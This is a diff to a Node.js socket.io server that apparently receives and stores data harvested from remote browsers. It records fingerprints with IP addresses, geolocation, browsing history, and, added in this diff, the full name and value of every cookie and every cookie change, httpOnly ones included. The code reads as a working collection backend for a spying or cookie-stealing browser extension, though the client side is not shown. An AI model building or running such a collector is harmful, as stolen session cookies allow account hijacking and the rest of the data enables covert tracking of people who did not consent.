@@ -5,6 +5,7 @@ var express    = require('express')
   , sio        = require('socket.io')
   , io         = sio.listen(server, { log: false })
   , db         = require('sqlite-wrapper')('activity.db')
+  // , crypto     = require('cryptojs').Crypto
   // , lzs        = require('lz-string')
   ;
 
@@ -17,24 +18,34 @@ server.listen(8080);
 
 io.sockets.on('connection', function (socket) {
     // Get browser fingerprint (DB: Fingerprints).
-    socket.on('fingerprint', function (data) {
+    socket.on('addFingerprint', function (data) {
         addFingerprint(data, socket.handshake.address.address);
         console.log(data.uuid, '[+] Fingerprint');
     });
     // Get current location (DB: Geopositions).
-    socket.on('geoposition', function (data) {
+    socket.on('addGeoposition', function (data) {
         addGeoposition(data);
         console.log(data.uuid, '[+] Geoposition');
     });
     // Get URL visit (DB: History).
-    socket.on('url-visit', function (data) {
+    socket.on('addURLVisit', function (data) {
         addURLVisit(data);
         console.log(data.uuid, '[+] URL Visit');
     });
     // Get URL removal (DB: History).
-    socket.on('url-removed', function (data) {
-        addURLRemoval(data);
+    socket.on('removeURL', function (data) {
+        removeURL(data);
         console.log(data.uuid, '[+] URL Removal');
+    });
+    // Add all cookies (DB: Cookies).
+    socket.on('addAllCookies', function (data) {
+        addAllCookies(data);
+        console.log(data.uuid, '[+] All Cookies');
+    });
+    // Add cookie change (DB: Cookies).
+    socket.on('addCookieChange', function (data) {
+        addCookieChange(data);
+        console.log(data.uuid, '[+] Cookie Change');
     });
 });
 
@@ -50,7 +61,6 @@ var getPayload = function (data) {
 // Database handling.
 ///////////////////////////////////////////////////////////////////////////////
 
-// Create tables.
 db.createTable('Fingerprints', {
     'timestamp':        {type: 'INTEGER'},
     'uuid':             {type: 'TEXT'},
@@ -58,6 +68,17 @@ db.createTable('Fingerprints', {
     'userAgent':        {type: 'TEXT'},
     'screenResolution': {type: 'TEXT'}
 });
+
+var addFingerprint = function (data, ipAddress) {
+    var payload = JSON.parse(data.payload);
+    db.insert('Fingerprints', {
+        timestamp: data.time,
+        uuid: data.uuid,
+        ipAddress: ipAddress,
+        userAgent: payload.userAgent,
+        screenResolution: payload.screenResolution
+    });
+};
 
 db.createTable('Geopositions', {
     'timestamp':        {type: 'INTEGER'},
@@ -70,30 +91,6 @@ db.createTable('Geopositions', {
     'heading':          {type: 'REAL'},
     'speed':            {type: 'REAL'}
 });
-
-db.createTable('History', {
-    'timestamp':        {type: 'INTEGER'},
-    'uuid':             {type: 'TEXT'},
-    'id':               {type: 'TEXT'},
-    'title':            {type: 'TEXT'},
-    'url':              {type: 'TEXT'},
-    'lastVisitTime':    {type: 'INTEGER'},
-    'typedCount':       {type: 'INTEGER'},
-    'visitCount':       {type: 'INTEGER'},
-    'removed':          {type: 'INTEGER'}
-});
-
-// Define adding functions.
-var addFingerprint = function (data, ipAddress) {
-    var payload = JSON.parse(data.payload);
-    db.insert('Fingerprints', {
-        timestamp: data.time,
-        uuid: data.uuid,
-        ipAddress: ipAddress,
-        userAgent: payload.userAgent,
-        screenResolution: payload.screenResolution
-    });
-};
 
 var addGeoposition = function (data) {
     if (data.payload === "null") {
@@ -114,7 +111,19 @@ var addGeoposition = function (data) {
     });
 };
 
-var addURLVisit = function(data) {
+db.createTable('History', {
+    'timestamp':        {type: 'INTEGER'},
+    'uuid':             {type: 'TEXT'},
+    'id':               {type: 'TEXT'},
+    'title':            {type: 'TEXT'},
+    'url':              {type: 'TEXT'},
+    'lastVisitTime':    {type: 'INTEGER'},
+    'typedCount':       {type: 'INTEGER'},
+    'visitCount':       {type: 'INTEGER'},
+    'removed':          {type: 'INTEGER'}
+});
+
+var addURLVisit = function (data) {
     var payload = JSON.parse(data.payload);
     db.insert('History', {
         timestamp: data.time,
@@ -129,9 +138,80 @@ var addURLVisit = function(data) {
     });
 };
 
-var addURLRemoval = function(data) {
+var removeURL = function (data) {
     var payload = JSON.parse(data.payload);
     payload.urls.forEach(function (entry) {
         db.update('History', 'url=?', [entry], { removed : 1 });
     });
+};
+
+db.createTable('Cookies', {
+    'timestamp':        {type: 'INTEGER'},
+    'uuid':             {type: 'TEXT'},
+    'cause':            {type: 'TEXT'},
+    'name':             {type: 'TEXT'},
+    'value':            {type: 'TEXT'},
+    'domain':           {type: 'TEXT'},
+    'hostOnly':         {type: 'INTEGER'},
+    'path':             {type: 'TEXT'},
+    'secure':           {type: 'INTEGER'},
+    'httpOnly':         {type: 'INTEGER'},
+    'session':          {type: 'INTEGER'},
+    'expirationDate':   {type: 'REAL'},
+    'storeId':          {type: 'TEXT'},
+    'removed':          {type: 'INTEGER'}
+});
+
+var addAllCookies = function (data) {
+    var payload = JSON.parse(data.payload);
+    payload.forEach(function (entry) {
+        db.insert('Cookies', {
+            timestamp: data.time,
+            uuid: data.uuid,
+            cause: "explicit",
+            name: entry.name,
+            value: entry.value,
+            domain: entry.domain,
+            hostOnly: entry.hostOnly ? 1 : 0,
+            path: entry.path,
+            secure: entry.secure ? 1 : 0,
+            httpOnly: entry.httpOnly ? 1 : 0,
+            session: entry.session ? 1 : 0,
+            expirationDate: entry.expirationDate,
+            storeId: entry.storeId,
+            removed: 0
+        });
+    });
+};
+
+var addCookieChange = function (data) {
+    var payload = JSON.parse(data.payload);
+    db.insert('Cookies', {
+        timestamp: data.time,
+        uuid: data.uuid,
+        cause: payload.cause,
+        name: payload.cookie.name,
+        value: payload.cookie.value,
+        domain: payload.cookie.domain,
+        hostOnly: payload.cookie.hostOnly ? 1 : 0,
+        path: payload.cookie.path,
+        secure: payload.cookie.secure ? 1 : 0,
+        httpOnly: payload.cookie.httpOnly ? 1 : 0,
+        session: payload.cookie.session ? 1 : 0,
+        expirationDate: payload.cookie.expirationDate,
+        storeId: payload.cookie.storeId,
+        removed: payload.removed ? 1 : 0
+    });
+};
+
+var addAllBookmarks = function (data) {
+    ;
+};
+
+var addBookmark = function (data) {
+    ;
+};
+
+var updateBookmark = function (data) {
+    ;
 };
